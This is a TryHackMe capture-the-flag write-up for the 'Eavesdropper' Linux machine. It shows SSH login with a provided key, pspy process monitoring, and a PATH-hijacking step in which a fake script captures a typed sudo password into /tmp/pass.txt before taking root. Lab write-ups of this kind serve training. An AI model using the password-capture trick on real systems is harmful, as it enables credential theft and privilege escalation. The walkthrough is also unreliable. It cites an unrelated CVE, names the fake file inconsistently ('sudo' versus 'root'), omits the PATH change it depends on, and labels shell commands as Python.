---
layout: post
title: "TryHackMe — Eavesdropper [Write-up]"
date: 2026-06-22
platform: thm
difficulty: Medium
category: write-up
tags: [linux, Hijacking]
---

## Overview

**Machine:** Eavesdropper  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Linux  
**CVE:** CVE-2017-16995

---

## Eavesdropper - TryHackMe Writeup
**Eavesdropper** - A challenge involving privilege escalation on a Linux system 

## 1: SSH Access

Download the file provided in the assignment and use it to log in via SSH under the “frank” account.

```python
chmod 600 id_rsa

ssh -i id_rsa frank@10.114.170.194
```
## 2: Find the attack vector

Using the [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64) tool, which will help us see which processes are running on the system

## 3: PATH Hijacking

At this stage, we need to create a sudo file 

```python
nano root
```

```python
#!/bin/bash
read password
echo $password > /tmp/pass.txt
```
Log back into the system, and in the /tmp directory, you can find a text file containing the password

## 4: Get Flag

```python
sudo su
cd /root
cat flag.txt
```
